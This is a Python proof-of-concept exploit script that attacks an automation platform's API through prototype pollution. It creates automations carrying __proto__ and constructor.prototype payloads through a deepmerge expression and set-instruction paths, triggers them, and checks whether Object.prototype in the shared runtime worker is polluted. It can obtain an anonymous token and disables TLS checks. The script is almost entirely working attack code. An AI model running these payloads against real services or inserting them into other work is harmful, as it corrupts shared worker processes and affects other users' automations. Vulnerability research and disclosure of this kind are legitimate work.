#!/usr/bin/env python3
"""
PoC #5 — Prototype Pollution via deepmerge and set instruction
CRITICAL: Two vectors to pollute Object.prototype in the runtime worker.

Vector A: deepmerge expression function uses lodash.mergeWith with __proto__
Vector B: set instruction traverses __proto__/constructor.prototype paths

Requires: Ability to create/run automations in a workspace.

Usage: python3 poc_05_prototype_pollution.py --target https://dev.example.com --workspace-id WS_ID --token AUTH_TOKEN
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


def create_automation_deepmerge(base_url, workspace_id, token):
    """Create automation that uses deepmerge to pollute __proto__."""
    print("\n[*] Vector A: Prototype pollution via deepmerge expression...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # Automation YAML/JSON that triggers prototype pollution
    automation = {
        "slug": "poc-proto-pollution-deepmerge",
        "name": "PoC Proto Pollution Deepmerge",
        "trigger": {
            "events": ["poc.test.deepmerge"]
        },
        "instructions": [
            {
                "set": {
                    "name": "malicious_obj",
                    "value": {
                        "__proto__": {
                            "polluted": True,
                            "poc": "deepmerge-pollution"
                        }
                    }
                }
            },
            {
                "set": {
                    "name": "target_obj",
                    "value": {}
                }
            },
            {
                "set": {
                    "name": "result",
                    # This expression uses deepmerge with __proto__ payload
                    "value": "{% deepmerge(target_obj, malicious_obj) %}"
                }
            },
            {
                "set": {
                    "name": "check",
                    # Check if pollution worked — any new object should have .polluted
                    "value": "{% {}.polluted %}"
                }
            },
            {
                "emit": {
                    "event": "poc.result",
                    "payload": {
                        "pollution_check": "{{check}}",
                        "message": "If pollution_check is true, Object.prototype is polluted"
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            data = r.json()
            auto_id = data.get("slug", data.get("id", "unknown"))
            print(f"  [INFO] Automation created: {auto_id}")
            return auto_id
        else:
            print(f"  Response: {r.text[:500]}")
            return None
    except Exception as e:
        print(f"  [ERROR] {e}")
        return None


def create_automation_set_proto(base_url, workspace_id, token):
    """Create automation that uses set with __proto__ path."""
    print("\n[*] Vector B: Prototype pollution via set instruction path traversal...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    automation = {
        "slug": "poc-proto-pollution-set",
        "name": "PoC Proto Pollution Set",
        "trigger": {
            "events": ["poc.test.set"]
        },
        "instructions": [
            # Direct __proto__ traversal via set name path
            {
                "set": {
                    "name": "__proto__.polluted_via_set",
                    "value": True
                }
            },
            {
                "set": {
                    "name": "constructor.prototype.polluted_via_constructor",
                    "value": True
                }
            },
            # Verify pollution
            {
                "set": {
                    "name": "verify",
                    "value": {}
                }
            },
            {
                "emit": {
                    "event": "poc.result",
                    "payload": {
                        "polluted_via_set": "{{verify.polluted_via_set}}",
                        "polluted_via_constructor": "{{verify.polluted_via_constructor}}",
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            data = r.json()
            auto_id = data.get("slug", data.get("id", "unknown"))
            print(f"  [INFO] Automation created: {auto_id}")
            return auto_id
        else:
            print(f"  Response: {r.text[:500]}")
            return None
    except Exception as e:
        print(f"  [ERROR] {e}")
        return None


def trigger_automation(base_url, workspace_id, token, event_type):
    """Trigger automation via event emission."""
    print(f"\n[*] Triggering automation via event: {event_type}...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "type": event_type,
        "payload": {}
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201, 202):
            print(f"  [INFO] Event emitted successfully")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def cleanup_automation(base_url, workspace_id, token, slug):
    """Delete the PoC automation."""
    url = f"{base_url}/v2/workspaces/{workspace_id}/automations/{slug}"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        requests.delete(url, headers=headers, verify=False, timeout=10)
        print(f"  [INFO] Cleaned up automation: {slug}")
    except:
        pass


def main():
    parser = argparse.ArgumentParser(description="PoC #5: Prototype Pollution")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    parser.add_argument("--cleanup", action="store_true", help="Delete PoC automations after test")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print(f"[*] Workspace: {args.workspace_id}")
    print("=" * 60)

    slugs = []

    # Vector A: deepmerge
    slug_a = create_automation_deepmerge(base, args.workspace_id, args.token)
    if slug_a:
        slugs.append(slug_a)
        trigger_automation(base, args.workspace_id, args.token, "poc.test.deepmerge")

    # Vector B: set path
    slug_b = create_automation_set_proto(base, args.workspace_id, args.token)
    if slug_b:
        slugs.append(slug_b)
        trigger_automation(base, args.workspace_id, args.token, "poc.test.set")

    print("\n[*] Check the events log for 'poc.result' events to confirm pollution")
    print("[*] If pollution_check/polluted_via_set is 'true', prototype is polluted")
    print("[*] This affects ALL automations in the runtime worker process!")

    if args.cleanup and slugs:
        print("\n[*] Cleaning up...")
        for s in slugs:
            cleanup_automation(base, args.workspace_id, args.token, s)

    print("\n" + "=" * 60)
    print("[*] DONE — review event logs for poc.result payloads")


if __name__ == "__main__":
    main()
